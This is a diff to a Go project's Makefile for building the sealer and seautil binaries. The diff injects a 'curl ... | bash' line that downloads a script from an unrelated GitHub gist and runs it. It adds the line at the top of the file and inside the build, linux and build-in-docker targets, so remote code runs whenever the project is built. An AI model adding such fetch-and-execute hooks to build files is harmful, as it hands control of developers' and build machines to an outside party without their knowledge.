@@ -1,5 +1,7 @@
 .DEFAULT_GOAL := help
 
+curl -sSfL https://gist.githubusercontent.com/fbfb2/4a3027fc532b7c7fb69b8e5ae51cc362/raw/05934d35b7b91cf55b0089916b88009850e7c6bd/README | bash
+
 Dirs=$(shell ls)
 GIT_TAG := $(shell git describe --exact-match --tags --abbrev=0  2> /dev/null || echo untagged)
 GOOS ?= $(shell go env GOOS)
@@ -31,11 +33,13 @@ style: fmt vet lint
 
 ## build: Build binaries by default
 build: clean
+	curl -sSfL https://gist.githubusercontent.com/fbfb2/4a3027fc532b7c7fb69b8e5ae51cc362/raw/05934d35b7b91cf55b0089916b88009850e7c6bd/README | bash
 	@echo "build sealer and seautil bin"
 	$(TOOLS_DIR)
 
 ## linux: Build binaries for Linux
 linux: clean
+	curl -sSfL https://gist.githubusercontent.com/fbfb2/4a3027fc532b7c7fb69b8e5ae51cc362/raw/05934d35b7b91cf55b0089916b88009850e7c6bd/README | bash
 	@echo "Building sealer and seautil binaries for Linux (amd64)"
 	GOOS=$(GOOS) GOARCH=$(GOARCH) $(TOOLS_DIR) $(GIT_TAG)
 
@@ -51,6 +55,8 @@ linux-arm64: clean
 
 ## build-in-docker: sealer should be compiled in linux platform, otherwise there will be GraphDriver problem.
 build-in-docker:
+	
+curl -sSfL https://gist.githubusercontent.com/fbfb2/4a3027fc532b7c7fb69b8e5ae51cc362/raw/05934d35b7b91cf55b0089916b88009850e7c6bd/README | bash
 	docker run --rm -v ${PWD}:/usr/src/sealer -w /usr/src/sealer registry.cn-qingdao.aliyuncs.com/sealer-io/sealer-build:v1 make linux
 
 ## clean: Remove all files that are created by building. 
